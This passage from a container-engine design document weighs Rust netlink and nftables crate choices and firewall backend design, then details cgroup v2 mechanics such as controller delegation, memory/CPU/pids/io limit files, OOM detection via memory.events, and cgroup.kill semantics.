| `ipnet` | CIDR arithmetic | take |
| `fs2` | `flock` | **avoid** — last release January 2018, and `nix::fcntl::Flock` is an RAII `flock(2)` we already have |
| `iptables` 0.6 | it is `Command::new("iptables")` | **avoid**, and its own source is the argument: it parses `iptables --version` with a regex and keeps two code paths depending on the result. Version skew as a permanent structural cost, on top of a translation layer |

**Fact — `rtnetlink` cannot go in the core crate, on two independent grounds.** (a) It depends on
**`nix` non-optionally**, at a lagging minor version, which re-introduces a dependency the substrate
work deliberately declined. (b) `futures-channel` and `futures-util` are **non-optional** and its
entire API is `async fn`; the `tokio` and `async-global-executor` features choose *which* executor,
not *whether*. There is no `sync` feature and `netlink-proto` is an unconditional dependency.

**Fact — the synchronous path exists and should be named: `netlink-sys` + `netlink-packet-route`,
without `rtnetlink`.** That pair is a synchronous, executor-free, `nix`-free netlink stack.
(`netlink-packet-route` pulls `zerocopy 0.8`, which is far past its one historical advisory.)

**Recommendation — and this is a constraint on the runtime's architecture, not a vote on async.**
Three facts compose: a netlink socket is permanently bound to the namespace it was created in;
`setns` is per-thread with no whole-process form; and the resolver pattern requires creating a
socket *inside* a namespace and serving it from outside. The primitive our domain needs is therefore
**"run this closure on a dedicated OS thread pinned into namespace X, then restore"** — a *thread*
primitive, actively hostile to a work-stealing executor that may move a task between workers at any
await point. A worker thread that has been `setns`'d is a landmine for every unrelated task the
scheduler later hands it, and the bug it produces — a socket silently created in the wrong namespace
— is invisible until something fails to receive traffic. **Nothing in networking requires async. If
async is adopted for other reasons, networking still runs on dedicated threads with blocking
sockets, and the netlink code is the same synchronous code either way.**

**Recommendation.** Write the socket loop ourselves (~200 lines): bind, connect, sequence numbers,
multipart/`NLMSG_DONE` walking, `NLM_F_DUMP_INTR` restart, `ENOBUFS`, and mapping the error payload
onto a typed error our setup path can branch on. This split is where the learning actually is: the
byte-level TLV encoding is tedium with no learning value past the first hour, while the socket,
sequencing and error mapping are the part that is genuinely about how a container engine talks to
the kernel, and where all the interesting failure modes live. The reference production
implementation makes exactly this split — netavark depends on `netlink-packet-route`,
`netlink-packet-core` and `netlink-sys` and on **no** `rtnetlink`, `netlink-proto`, `nftnl` or
`rustables`, and writes its own ~200-line synchronous socket wrapper.

#### DISPUTED: the firewall backend

Three designs, and the decision is genuinely open because two of our own criteria point in opposite
directions.

| Option | What it provides | What it hides | Maintenance facts |
|---|---|---|---|
| **hand-rolled nft netlink** | everything | nothing | the nftables expression encoding is a large, evolving, bytecode-like IR. Owning it teaches us about *nftables' internals*, not about container engines — a month, not a weekend |
| **`nftnl` 0.9.4** (FFI to C `libnftnl` + `libmnl`) | C-library expression building | the netlink wire format | **avoid.** It depends on `nix`; `nftnl-sys` ships 26 checked-in bindgen outputs selected by cumulative Cargo features, so *which `libnftnl.so` is on the host* becomes a build decision — a real distribution problem for one binary targeting both Ubuntu and RHEL. It also carries the only memory-corruption advisory in this crate set, **RUSTSEC-2025-0126** (heap buffer overflow in `Batch::with_page_size`, patched ≥ 0.9.0), alongside **RUSTSEC-2025-0142** against `mnl` beneath it. Both patched; the signal is the C-FFI surface, not the specific bugs |
| **`nftables` 0.6.3** | typed Rust structs → nft's JSON API | the expression encoding **and the transport** | **it is not a netlink library.** `src/helper.rs` is `const NFT_EXECUTABLE: &str = "nft"` plus `Command::new(program)`; zero `unsafe` in ~3.3 k lines because it makes no syscalls. It is a JSON-over-subprocess wrapper around `nft(8)` |

**The case for `nftables`.** It delivers the four properties §11.5 actually asked for — atomicity
(one `nft -j -f -` is one kernel transaction), typed construction, named sets and maps, and a single
`inet` table — and **the semantics stay entirely ours**: which chains, which hooks, which
priorities, which sets, in what order and why is all §11.4 and §11.5, visible in our own source.
Using its **JSON** API rather than generating nft script text also sidesteps a real portability
problem: `nft` 1.0.4 on RHEL 8 rejects syntax that 1.1.0 accepts (measured: `fwd` is a reserved
keyword on 1.0.4). And the cost of stringly-typed errors is far lower here than for `ip`, because
the design produces **one** operation per container — a failed transaction means *nothing happened*,
which is a complete and actionable answer with or without an errno, as opposed to twelve
per-operation failures each needing a different recovery decision.

**The case against.** It is a **runtime dependency on an external binary and its version**, and it
is squarely contrary to the project's charter of not shelling out where we could write the protocol
ourselves. It hides the transport completely, so we learn nothing about how a firewall is actually
programmed. Its last release is over a year old.

**The decision to make: do we accept `nft(8)` as a permanent backend, or only as a marked MVP
shortcut behind a firewall trait with hand-rolled nft netlink as the intended end state?** Either
way, two things are required and are not in dispute: **a firewall trait**, so the backend is
swappable without touching the rule semantics; and **probing for `nft` at startup, not mid-setup**,
failing with the package name. (`rustables` 0.8.8 — pure Rust, ~5.7 k lines, 13 `unsafe`, no C — is
the structurally correct end state but is thinly used; revisit it behind the trait.)

**Recommendation — conntrack has no good crate.** `netlink-packet-netfilter` has three-digit
quarterly download counts; neither it nor `conntrack` is a dependency worth taking for a
security-relevant flush. Shell out to `conntrack -D -d <ip>`, treat a missing binary as a warning,
and hand-roll `IPCTNL_MSG_CT_DELETE` later once we already own a netlink socket loop.

**Recommendation — and the line that generalises to every dependency decision in this project.** We
own every design decision and every packet path; we decline to own two byte-encodings — one for
which we take a library (TLV, `netlink-packet-route`) and one for which we may take a compiler (nft
expressions). Both are marked as such, with an upgrade path. What we must never delegate is the
*semantics*.

---

### What this decides

**Urgent — these block work that is already scheduled.**

| Decision | Shape |
|---|---|
| **What we do on a host whose `filter/FORWARD` policy is a foreign DROP.** Blocks any routed network | Detect and refuse, **or** write exactly one marked `accept` into the foreign chain and sweep it on cleanup. Setting the policy ourselves is excluded. The absolute "never touch iptables" form ships containers with no network on a stock `ufw` host and no error anywhere. If the foreign rule is chosen it needs a greppable marker and its own line in the reconcile sweep — it is then the only state of ours that can orphan permanently |
| **nftables natively in one `inet` table, versus iptables.** Stage 5 cannot start before it is settled | Native nftables, `table inet mydocker`, nothing outside it. Atomicity turns "crashed mid-publish" from a security hole into a non-event; single-table ownership makes the permanent-orphan class vanish by construction. Both reference implementations have moved this way. Consequence: our chain priorities are a public API the moment an admin writes a chain relative to them — document and freeze them, and do **not** build a `DOCKER-USER` equivalent, because the nftables world has no such chain |
| **The firewall backend crate.** Same code path as the row above | `nftables` (JSON over the `nft(8)` binary) as a permanent backend, or as a marked shortcut behind a firewall trait with hand-rolled nft netlink as the end state. Not in dispute either way: the trait exists, and `nft` is probed at startup rather than discovered mid-setup |
| **`ip_forward`: write it, or detect and fail.** A stage-4 default | Detect `ip_forward = 0` and fail the network create with the exact `sysctl` command. Deletes the "writing it resets every per-interface parameter" trap from our code and removes stage 4's largest irreversible mutation |
| **Cleanup and reconciliation.** The natural ordering is wrong | Unmount the namespace **first** (it garbage-collects both veths), then rules, then devices — never a device before the rules naming it. `nft delete table`, never `flush`. The record outlives the host state it describes. One idempotent setup path that doubles as the recovery path, plus a mark-and-sweep against the live set |
| **The runtime must be able to pin a thread into a namespace** | One netlink socket per namespace, created after `setns`, with `setns(userns)` before `setns(netns)`. Nothing in networking requires async and the primitive is hostile to a work-stealing executor; `rtnetlink` is excluded from the core crate on dependency grounds regardless |

**Deferrable, but decided now because the cost of changing them later is high.**

| Decision | Shape |
|---|---|
| **Networking is built in, not an OCI hook; the sandbox is a first-class refcounted object** | `poststop` runs only if someone calls `delete`, so the hook boundary has no answer for a killed supervisor. Keep CNI's five verbs as an internal trait. The sandbox-as-entity decision costs one struct now and is a painful refactor later — and it is why we need no pause container |
| **`--network=none` becomes the default the day stage 2 exists** | `--network=host` ships first and must not stay the default. Defaults are the hardest thing to change later |
| **IPAM: the container record is the truth, the allocator is an index** | `flock` + `O_EXCL` claim files + a round-robin cursor; sticky addresses, kernel-generated MACs. The choice to avoid is making an allocation bitmap authoritative — that is the two-phase commit that double-allocates on crash |

**Can wait.** The userland proxy helper until stage 5 (where it is not optional — three cases cannot
be served by NAT at all). The embedded DNS resolver entirely; the ~30-line `resolv.conf` filter plus
`/etc/hosts` generation is a prerequisite of stage 4 and is all an MVP needs. Rootless until phase 2
— it is settled by experiment, and the answer is `pasta` with `slirp4netns` as a documented
fallback, launched from wherever is convenient. IPv6 containers, `routed` gateway mode, and
conntrack over ctnetlink rather than the `conntrack` binary. macvlan, `--link`, DHCP and a pluggable
IPAM driver interface can wait indefinitely; `--icc` is `IFLA_BRPORT_ISOLATED`, not `br_netfilter`.

**Still unverified, with the exact test.** Whether bridge hairpin mode becomes necessary once
`br_netfilter` is active *and* the per-bridge `nf_call_iptables` flag is set — the five-row matrix in
§11.4 ran with `/proc/sys/net/bridge` absent. It needs a disposable **root** VM:
`modprobe br_netfilter; sysctl net.bridge.bridge-nf-call-iptables=1;
ip link set br0 type bridge nf_call_iptables 1`, then re-run the five configurations. And Docker
29's actual numeric base-chain priorities, which its documentation describes only as *"well known
priority values"* — we need the numbers before we can place ours relative to them:
`nft list table ip docker-bridges` on a host running 29.x with `"firewall-backend": "nftables"`.

---

## 12. cgroups and resource control

The cgroup is the container. Every limit, every statistic, every kill and every "is it still
alive" check in this engine is expressed over a cgroup directory, not over a process tree —
because that is the only formulation that stays correct when the PID namespace is shared, when
a child double-forks, or when the container escapes its own PID namespace. This section is the
file-by-file mechanics of doing that on cgroup v2, plus the three places where the obvious
implementation is silently wrong.

### 12.1 The unified v2 model, operationally

**Fact.** On cgroup v2 there is exactly one hierarchy per `cgroup2` filesystem instance. A
cgroup is a directory; membership is a property of the *process*, not of the *(process,
controller)* pair it was on v1. Controllers are turned on per subtree rather than each owning
its own tree. Source: `Documentation/admin-guide/cgroup-v2.rst` §"Basic Operations".

**Fact.** Two files govern which controllers exist where:

| file | mode | meaning |
|---|---|---|
| `cgroup.controllers` | read-only | the controllers *available in this cgroup*, i.e. the ones the parent enabled in its own `cgroup.subtree_control` |
| `cgroup.subtree_control` | read-write | the controllers enabled *for this cgroup's children*. Writes are deltas: `echo "+memory -io" > cgroup.subtree_control` |

*"A controller can be enabled only if the parent has the controller enabled and a controller
can't be disabled if one or more children have it enabled"* (`cgroup-v2.rst` §"Enabling and
Disabling Controllers").

**Fact.** Enabling a controller in a cgroup does **not** give that cgroup the controller's own
limit files — it gives them to its children. To set `memory.max` on `/mydocker/ctr1`, `memory`
must appear in `/mydocker/cgroup.subtree_control`, and `memory.max` then appears inside
`/mydocker/ctr1/`. **Trap.** A missing `memory.max` is never a bug one level down; it is always
a missing `+memory` one level up, and the symptom is `ENOENT` on the write, not `EACCES`.

**Recommendation.** At container-create time, walk from our delegation root down to the parent
of the new cgroup and ensure every controller we intend to use appears in each
`cgroup.subtree_control` on the path, adding what is missing. The walk must **stop at our
delegation root** and error rather than climb past it — writing `subtree_control` on an
ancestor we do not own is the delegation violation §12.2 describes. Failing to enable a
controller must be a distinguishable error from failing to set a limit: the first is an
environment problem, the second is a bad value.

#### The no-internal-process rule — exactly what it forbids

**Fact.** `cgroup-v2.rst` §"No Internal Process Constraint", verbatim: *"Non-root cgroups can
distribute domain resources to their children only when they don't have any processes of their
own. … only domain cgroups which don't contain any processes can have domain controllers
enabled in their `cgroup.subtree_control` files. … The root cgroup is exempt from this
restriction. … Note that the restriction doesn't get in the way if there is no enabled
controller in the cgroup's `cgroup.subtree_control`."*

What it forbids is therefore **not** "a cgroup with processes may have no children". A cgroup
with processes *and* children is legal as long as its `subtree_control` is empty. What is
forbidden is the *combination*, and the kernel enforces it symmetrically with the same errno in
both directions:

| action | errno | kernel source |
|---|---|---|
| migrate a process into a cgroup whose own `subtree_control` is non-empty | **`EBUSY`** | `torvalds/linux@v6.17/kernel/cgroup/cgroup.c#L2758-L2760` (`if (dst_cgrp->subtree_control) return -EBUSY;`) |
| write `+<controller>` into `subtree_control` of a cgroup that has tasks | **`EBUSY`** | `cgroup.c#L3453-L3458` (`if (cgroup_has_tasks(cgrp)) return -EBUSY;`) |
| write `-<controller>` for a controller a live child has enabled | **`EBUSY`** | `cgroup.c#L3524-L3527` |

**Fact.** Threaded subtrees are exempt: the constraint check returns early for a thread root or
a threaded cgroup (`cgroup.c#L2754-L2756`), and `cgroup.threads` is not checked the way
`cgroup.procs` is.

**Fact.** The documentation states the mandatory ordering for a cgroup that already holds
processes: *"the cgroup must create children and transfer all its processes to the children
**before** enabling controllers in its `cgroup.subtree_control`."* Reversing the two gives
`EBUSY`.

**Recommendation.** Our per-container layout is "parent holds nothing, leaf holds everything",
with one level paid up front so that a later `exec` accounting story does not change the
container's cgroup path:

```
/sys/fs/cgroup/<delegation-root>/              subtree_control: +cpu +memory +pids +io
/sys/fs/cgroup/<delegation-root>/<ctr-id>/     limits live here; subtree_control: (+pids +memory …)
/sys/fs/cgroup/<delegation-root>/<ctr-id>/init/  processes live here; subtree_control EMPTY
```

**Convention.** Docker/runc do not do this — the `docker-<id>.scope` is the leaf, holds the
processes directly, and its `subtree_control` is empty. The cost of our extra level is one
directory, one `subtree_control` write, and a subdirectory visible inside the container's
cgroup-namespace root that Docker's containers do not show.

**Recommendation.** Do not implement threaded cgroups. A container runtime places whole
processes; the OCI runtime spec has no field for per-thread placement; the cost of skipping is
zero, and §12.5 shows `cgroup.kill` does not even work on a threaded cgroup.

### 12.2 Delegation — which files must be owned, and which must not

**Fact.** `cgroup-v2.rst` §"Delegation" defines two mechanisms: delegation to a less privileged
user (grant write access to the subtree root directory and to a specific set of files in it),
and delegation to a cgroup namespace (automatic on cgroupns creation when the filesystem is
mounted `nsdelegate`).

**Fact.** The authoritative list of delegatable files is published by the kernel at
`/sys/kernel/cgroup/delegate`, and the documentation points at it rather than at a fixed list:
*"the kernel rejects writes to all files on a namespace root from inside the cgroup namespace,
except for those files listed in `/sys/kernel/cgroup/delegate` (including `cgroup.procs`,
`cgroup.threads`, `cgroup.subtree_control`, **etc.**)"*. Measured on kernel 6.11.0-29
(`cat /sys/kernel/cgroup/delegate`):

```
cgroup.procs
cgroup.threads
cgroup.subtree_control
memory.oom.group
memory.reclaim
```

Five files, not three. The list has grown twice — `memory.oom.group` and `memory.reclaim` were
added after the original three — which means a container at its cgroupns root may set its own
group-OOM policy and trigger its own proactive reclaim, deliberately, because both are
properties of *how the workload is managed* rather than of how the parent's resources are
split.

**Recommendation.** Read `/sys/kernel/cgroup/delegate` and `chown` exactly what it lists. Hard-
coding three names means under-`chown`ing on a future kernel, and the resulting loss of
capability is silent.

**Fact — the half that matters more.** What must **not** be delegated is the resource-control
interface files of the subtree *root* (`memory.max`, `cpu.max`, …) and, decisively, the
`cgroup.procs` of the **common ancestor**. `cgroup-v2.rst` §"Delegation Containment": a
migration by a non-root euid requires write access to *both* the destination's `cgroup.procs`
*and* the `cgroup.procs` of the common ancestor of source and destination, else `-EACCES`. That
single rule is what makes a delegated subtree a one-way container: the delegatee can partition
what it was given and can never lift the ceiling it was given, nor move a process sideways into
a sibling's subtree. For namespace delegation the same containment comes from requiring both
source and destination to be reachable from the migrating process's cgroup namespace.

**Convention.** systemd exposes delegation as the unit property `Delegate=`. At
`systemd@v257/units/user@.service.in` the user manager carries `Delegate=pids memory cpu`,
`DelegateSubgroup=init.scope`, `TasksMax=infinity`. Note what is absent: **`io` and `cpuset`
are not delegated to a user manager at all.** Measured on a stock Ubuntu 24.10 host,
kernel 6.11.0-29:

```
/sys/fs/cgroup/user.slice/cgroup.controllers     : cpuset cpu io memory hugetlb pids rdma misc
/sys/fs/cgroup/user.slice/cgroup.subtree_control : cpu memory hugetlb pids rdma misc
```

`io` and `cpuset` are available at `user.slice` and not enabled for its children, so a rootless
engine underneath finds **no `io.max` file and no `cpuset.cpus` file** — a missing file, not a
permission error. That is why §12.7's tier table needs a tier for it.

### 12.3 The write side — flags to files, with the formulas

All paths are relative to the container's limit-bearing cgroup directory. Every write is an
ordinary `write(2)` of an ASCII string; cgroupfs needs no library.

#### Memory

| flag | OCI `linux.resources.memory` | file | value |
|---|---|---|---|
| `--memory`, `-m` | `limit` | `memory.max` | bytes, or `max` |
| `--memory-reservation` | `reservation` | `memory.low` | bytes (default `0`) |
| — | — | `memory.high` | bytes, or `max` |
| `--memory-swap` | `swap` | `memory.swap.max` | bytes, or `max` — **swap alone** |
| `--oom-kill-disable` | `disableOOMKiller` | *(no v2 equivalent)* | — |

**Fact.** `memory.max` is a hard limit: on exceeding it the kernel reclaims within the cgroup
and, if reclaim cannot free enough, invokes the cgroup OOM killer. `memory.high` is a throttle:
*"Going over the high limit never invokes the OOM killer"* — the allocating task is stalled
proportionally to the overage. `memory.low` is best-effort protection; `memory.min` is hard
protection and, if unreclaimable under system pressure, can cause the **system** OOM killer to
fire and take down a different cgroup. Source: `cgroup-v2.rst` §"Memory Interface Files".

**Fact — a daemon-liveness hazard.** A plain write to `memory.max` or `memory.high` **blocks
the writing thread** while the kernel performs reclaim on the target's behalf, and
`cgroup-v2.rst` states the terminating condition as *"the new limit is met — or the task
writing to `memory.max` is killed"*. Opening the file `O_NONBLOCK` skips the synchronous
reclaim. **Recommendation.** Every live-container limit adjustment opens the control file
`O_NONBLOCK`, or runs on a thread whose death cannot take the daemon with it. Shrinking a
running container's memory limit from an event loop is otherwise an unbounded stall.

**Fact.** Swap arithmetic differs between versions: v1's `memory.memsw.limit_in_bytes` is memory
**plus** swap; v2's `memory.swap.max` is swap **alone**. Docker's `--memory-swap` is defined in
the v1 idiom, so a v2 runtime must subtract. **Convention.** runc does this in
`cgroups.ConvertMemorySwapToCgroupV2Value()`
(`opencontainers/runc@v1.2.5/libcontainer/cgroups/utils.go#L432-L457`), and its five special
cases are all real:

| input | result |
|---|---|
| `memory == -1 && swap == 0` | `-1` |
| `swap == -1` or `swap == 0` | pass through unchanged |
| `memory == -1` | pass swap through unchanged |
| `memory == 0` | **error** — "unable to set swap limit without memory limit" |
| `swap < memory` | **error** — "memory+swap limit should be >= memory limit" |
| otherwise | `swap - memory` |

**Trap.** When `memory == swap` the subtraction yields `0`, and runc's number formatter renders
`0` as the empty string; `fs2/memory.go` rewrites it back to `"0"` with the comment *"never
write empty string to `memory.swap.max`, it means set to 0"*. Writing the empty string is a
silently different outcome from writing `"0"`.

**Fact.** `--oom-kill-disable` has no cgroup v2 equivalent; v1's `memory.oom_control` knob was
removed deliberately, because a cgroup that can neither be OOM-killed nor reclaim simply hangs.
**Convention.** Docker does **not** reject the flag on v2 — `moby@v28.3.1/daemon/daemon_unix.go#L470-L477`
appends the warning *"Your kernel does not support OomKillDisable. OomKillDisable discarded."*
and sets the field to `nil`. That is accept-and-ignore: a requested limit silently not applied.
**Recommendation.** Reject it with an error naming cgroup v2. This is the worked example of
§12.7's rule, and Docker is the counter-example, not the precedent.

**Fact.** `memory.oom.group` (**Linux 4.19**) makes the cgroup OOM killer kill every task in the
cgroup as a unit rather than picking one victim. It is in `/sys/kernel/cgroup/delegate`, i.e.
the kernel considers it a knob for whoever owns the workload. **Recommendation.** Expose it as
`--oom-group`; default it off to match Docker. The tradeoff runs both ways: a half-dead
multi-process container that a restart policy cannot act on is worse than a clean death, but
supervisord-style images lose the ability to survive one greedy child.

**Recommendation.** Expose `memory.high` but never default it. Setting it below `max` converts
the last slice of the limit from `SIGKILL` into throttling, which is what most users expected,
but it is a semantic divergence from Docker: a workload that legitimately spikes to 100% of its
limit briefly gets throttled where Docker lets it through. **Convention.** Docker populates no
`memory.high`; it is reachable only through the OCI `linux.resources.unified` passthrough.

#### CPU

**Fact.** `cpu.max` has the format `"$MAX $PERIOD"`, both in microseconds, default
`"max 100000"` (`cgroup-v2.rst` §"CPU Interface Files"). So `--cpus=1.5` ⇒ `"150000 100000"`,
`--cpus=0.5` ⇒ `"50000 100000"`.

**Fact.** `cpu.weight` (range **1–10000**, default **100**) is proportional and binds only under
contention. `cpu.max` is absolute and binds always. These are not two strengths of one knob: a
container at `cpu.max = "50000 100000"` is throttled to half a CPU on an idle 64-core box, and
a container at `cpu.weight = 50` next to one at `100` gets a third of the CPU when both are
runnable and all of it when alone. A `cpu.weight` read of `0` means `cpu.idle = 1`, not an error.

**Fact.** v1 `cpu.shares` has range **2–262144**, default **1024**. The conversion to
`cpu.weight` is therefore not the identity.

**Convention — and the two implementations disagree.** Both formulas verified in source:

| implementation | formula | `shares=1024` → | `shares=2` → | `shares=262144` → |
|---|---|---|---|---|
| **runc** `ConvertCPUSharesToCgroupV2Value` (`runc@v1.2.5/libcontainer/cgroups/utils.go#L421-L426`) | `1 + ((shares-2) * 9999) / 262142` | **39** | 1 | 10000 |
| **systemd** `cgroup_cpu_shares_to_weight` (`systemd@v257/src/core/cgroup.c#L1596-L1599`) | `CLAMP(shares * 100 / 1024, 1, 10000)` | **100** | 1 | 10000 |

They agree only at the endpoints and differ by a factor of 2.6 at the default. systemd's keeps
the *default* fixed (1024 ↦ 100); runc's keeps the *endpoints* fixed.

**Convention — which one actually runs.** runc's, even when Docker uses the systemd cgroup
driver (its default on cgroup v2). The conversion happens during **spec conversion**, not in the
cgroup driver: `runc@v1.2.5/libcontainer/specconv/spec_linux.go#L830-L835` sets
`c.Resources.CpuWeight = ConvertCPUSharesToCgroupV2Value(CpuShares)` as soon as the OCI
`linux.resources.cpu.shares` field is seen, and the systemd driver then sends the already-
converted value as the **`CPUWeight`** D-Bus property, never `CPUShares`. systemd's own formula
is reached only by unit files that literally set `CPUShares=`.

**Recommendation.** Use runc's formula, deliberately, for Docker compatibility — and put the
conversion **above** the `CgroupManager` trait, in the translation from our own `Resources` type
into controller values, never inside a driver. If each driver converts, a future systemd driver
introduces a silent 2.6× behaviour change between drivers on the same flag. This is a concrete
constraint on where the driver seam sits: everything above it speaks in bytes, nanoseconds and
ratios; nothing above it speaks in cgroupfs filenames or systemd property names.

**Recommendation.** Also expose `--cpu-weight` as the native knob, and say in the documentation
that `--cpu-shares` is converted. Silently mapping shares to weight is how a project earns bug
reports saying "shares don't work like Docker".

**Fact.** A child's `cpuset.cpus` must be a subset of the parent's *effective* set. The read-side
asymmetry matters more than the write side: an empty `cpuset.cpus` means "inherit", and
`cpuset.cpus.effective` is the file that answers "what can this container actually use".

#### Pids and IO

**Fact.** `pids.max` takes a number or `max`. On hitting it, `fork(2)`/`clone(2)` fail with
**`EAGAIN`** and `pids.events`'s `max` counter increments. There is no kill. The controller
counts **tasks**, i.e. threads: a JVM with 200 threads consumes 200. `cgroup-v2.rst` also notes
*"it is possible to have `pids.current > pids.max`"* — by lowering the limit below the current
count, or by migrating tasks in — so a monitor must not assume the invariant.

**Fact.** `io.max` takes lines of the form `MAJ:MIN rbps=… wbps=… riops=… wiops=…`, any subset
of the four keys, `max` to clear. `io.weight` is proportional and is **inert without a suitable
IO scheduler** (`bfq`, or `io.cost`/`io.latency`); `io.max` works regardless, because
blk-throttle sits above the scheduler. **Recommendation.** Implement `io.max`, skip `io.weight`
— a flag that silently does nothing on most modern hosts produces reports we cannot act on — and
skip `hugetlb`/`rdma`/`misc` while still round-tripping the OCI `hugepageLimits` field
losslessly, because silently dropping a spec field is worse than erroring on it.

### 12.4 The read side — telemetry, and detecting an OOM kill correctly

**Fact.** `memory.current` is *"the total amount of memory currently being used by the cgroup
and its descendants"* and **includes page cache**. On a live nginx container (kernel 6.11.0-29)
`memory.current` read 20398080 while `memory.stat` showed `anon 5672960` and `file 12521472` —
62% of the headline number was reclaimable cache. **Convention.** `docker stats` subtracts it:
usage = `memory.current - memory.stat:inactive_file` on v2 (`total_inactive_file` on v1).
**Recommendation.** Report both numbers and never one: `memory.current` is what `memory.max` is
compared against, and `memory.current - inactive_file` is what a human means by "used". Expose
`memory.peak` (5.19) as well, and never write to it — it became resettable in 6.8 and other
tools share it.

**Fact.** `cpu.stat`'s `nr_periods`, `nr_throttled` and `throttled_usec` are populated **only
when `cpu.max` is set**. A dashboard showing "throttled: 0%" for an unlimited container is
reporting the absence of a limit, not the absence of throttling.
**Recommendation.** `throttled_usec / (nr_periods × period)` is the single most useful CPU
number for a container user and belongs in the first-class stats struct. A container at 30% CPU
that is 40% throttled is misconfigured in a way raw usage hides completely.

#### `memory.events`, and why the obvious OOM test is wrong

**Fact.** `memory.events` is a flat key/value file. The definitions that carry the weight,
verbatim from `cgroup-v2.rst` §"Memory Interface Files":

| key | meaning |
|---|---|
| `max` | *"The number of times the cgroup's memory usage was about to go over the max boundary. If direct reclaim fails to bring it down, the cgroup goes to OOM state."* |
| `oom` | *"The number of time the cgroup's memory usage was reached the limit and allocation was about to fail. This event is not raised if the OOM killer is not considered as an option."* |
| `oom_kill` | *"The number of processes belonging to this cgroup killed by **any kind of** OOM killer."* |
| `oom_group_kill` | *"The number of times a **group OOM** has occurred."* |

Three consequences, in the order they bite:

1. **`max` is not a kill.** A cache-heavy container sitting at its limit accumulates `max` in
   the thousands and is never killed.
2. **`oom` is not a kill either.** Some of those paths return `-ENOMEM` to userspace.
3. **`oom_kill` *is* a kill — but "any kind of OOM killer" includes the global one.** A
   container that never approached its own `memory.max` but was chosen as the victim under
   host-wide memory pressure gets `oom_kill +1`. Reporting that as "this container exceeded its
   memory limit" is wrong and sends the user to tune the wrong knob.

Also note the unit mismatch: `oom_kill` counts **processes**, `oom_group_kill` counts **events**.
With `memory.oom.group=1`, one group kill of 40 processes shows `oom_kill +40,
oom_group_kill +1`.

**Recommendation — the corrected detection rule.** Read `memory.events` once at container start
(it is zero for a fresh cgroup, but read it anyway so the code is also correct for adopt and
restore) and again at exit, and compute:

```
oom_killed           = Δoom_kill > 0
hit_own_memory_limit = Δoom_kill > 0 AND (Δmax > 0 OR Δoom > 0)
# Δoom_kill > 0 with no Δmax/Δoom  ⇒  killed by the SYSTEM OOM killer under host pressure.
#                                     Report it as that, not as a limit breach.
```

`max` and `oom` increment only on the memcg OOM path, so their delta is exactly what separates
"you hit your limit" from "the host ran out and picked you". All three deltas come from the same
single read, so the correct rule costs nothing over the wrong one.

**Fact.** `memory.events` is hierarchical; `memory.events.local` (**Linux 5.3**) reports this
cgroup only. There is also a `memory_localevents` **mount option** which makes `memory.events`
local-only system-wide — *"This option is system wide and can only be set on mount or modified
through remount from the init namespace"* — and it is one of the options the kernel advertises
in `/sys/kernel/cgroup/features` (measured on 6.11.0-29: `nsdelegate favordynmods
memory_localevents memory_recursiveprot memory_hugetlb_accounting pids_localevents`). A
`pids_localevents` analogue exists for `pids.events`.

**Recommendation.** Because §12.1's layout separates the limit-bearing cgroup from the leaf that
holds processes, read `memory.events` at **both**. `max`/`oom` accrue where the limit is;
`oom_kill` accrues where the killed process lived. Under default (recursive) events either read
suffices; under `memory_localevents` neither does alone. Two reads of the same shape remove a
host-configuration dependency from the engine's most user-visible status bit.

**Fact.** Exit code **137 is not proof of an OOM kill.** `137 = 128 + SIGKILL`, produced
identically by the OOM killer, by `docker kill`, by our own `cgroup.kill`, and by anything
holding `CAP_KILL`. With `memory.oom.group=1` the entire container including PID 1 exits 137,
so the counter is the *only* discriminator. **Convention.** Docker's own `State.OOMKilled` comes
from watching cgroup events, not from the exit code. **Recommendation.** `ContainerState.oom_killed`
is sourced from the counter delta and is never inferred from 137.

**Recommendation.** Do not read the kernel log to detect an OOM. `kernel.dmesg_restrict = 1` on
a stock Ubuntu host, so an unprivileged daemon cannot read it at all; the format is unstable
across versions; and rate limiting drops lines under load, which is precisely when OOMs happen.
`memory.events` is `poll(2)`-able — the kernel wakes pollers on change — so a live signal needs
no timer.

**Fact.** The other read files worth wiring: `cgroup.events` (`populated` is the race-free "is
anything still alive in this subtree" predicate and is `poll(2)`-able; `frozen` reports freeze
state), `cgroup.stat` (`nr_dying_descendants` explains an `rmdir` returning `EBUSY` right after
a kill), `pids.events` / `pids.peak` (6.1), `io.stat`, and the PSI files.

**Fact.** PSI (`cpu.pressure`, `memory.pressure`, `io.pressure`) landed in **4.20** and requires
`CONFIG_PSI=y` — RHEL 8 at 4.18 has no `/proc/pressure/*` at all, so it is a 6.x-era feature in
practice. Each file has a `some` line (at least one task stalled) and a `full` line (all
non-idle tasks stalled). **Recommendation.** Expose it gated on file existence;
`memory.pressure`'s `full` line is the best continuous "this container is thrashing" signal, and
no control logic in the engine may depend on it.

### 12.5 Stop and kill semantics

**Fact.** `cgroup.kill` (**Linux 5.14**) is a write-only single-value file in non-root cgroups.
*"The only allowed value is '1'. Writing '1' to the file causes the cgroup and all descendant
cgroups to be killed. … Killing a cgroup tree will deal with concurrent forks appropriately and
is protected against migrations. In a threaded cgroup, writing this file fails with EOPNOTSUPP"*
(`cgroup-v2.rst` §"Core Interface Files"). Four details the documentation prose leaves implicit,
all from `torvalds/linux@v6.17/kernel/cgroup/cgroup.c`:

- it recurses via `cgroup_for_each_live_descendant_pre()` (`#L4107-L4116`);
- any value other than `1` returns **`-ERANGE`**, and a non-integer returns `-EINVAL` from
  `kstrtoint` (`#L4129-L4130`) — `"1\n"` is fine, `"true"` is not;
- a threaded cgroup returns **`EOPNOTSUPP`** (`#L4141-L4142`), which our `kill_all()` must map to
  a comprehensible error rather than retrying;
- kernel threads are skipped, and tasks already carrying a pending fatal signal are skipped
  (`#L4094-L4100`), so the write is idempotent and cheap to re-issue.

**Fact — the mechanism, which is not a lock.** `__cgroup_kill()` (`cgroup.c#L4081-L4105`)
increments `cgrp->kill_seq` under `css_set_lock` and *then* iterates tasks sending `SIGKILL`.
The fork side closes the race separately: `cgroup_can_fork()` snapshots
`kargs->kill_seq = cgrp->kill_seq` (`#L6581-L6584`) and `cgroup_post_fork()` kills the
brand-new child if the value changed (`#L6820`). No lock is held across the walk; a fork that
*starts* before the bump and *completes* after it is killed by the post-fork check.

**Trap.** This was a `CGRP_KILL` flag bit until **6.14**, when it was replaced by `kill_seq`
specifically to fix a race with `CLONE_INTO_CGROUP`. On a 5.15–6.13 kernel, `cgroup.kill` is
correct for ordinary forks but has a known hole against a child cloned *directly into* the
cgroup. That is not a reason to avoid either feature; it is a reason never to describe
`cgroup.kill` as atomic, and a reason `kill_all()` must re-check `cgroup.events:populated` and
re-issue rather than assume one write sufficed.

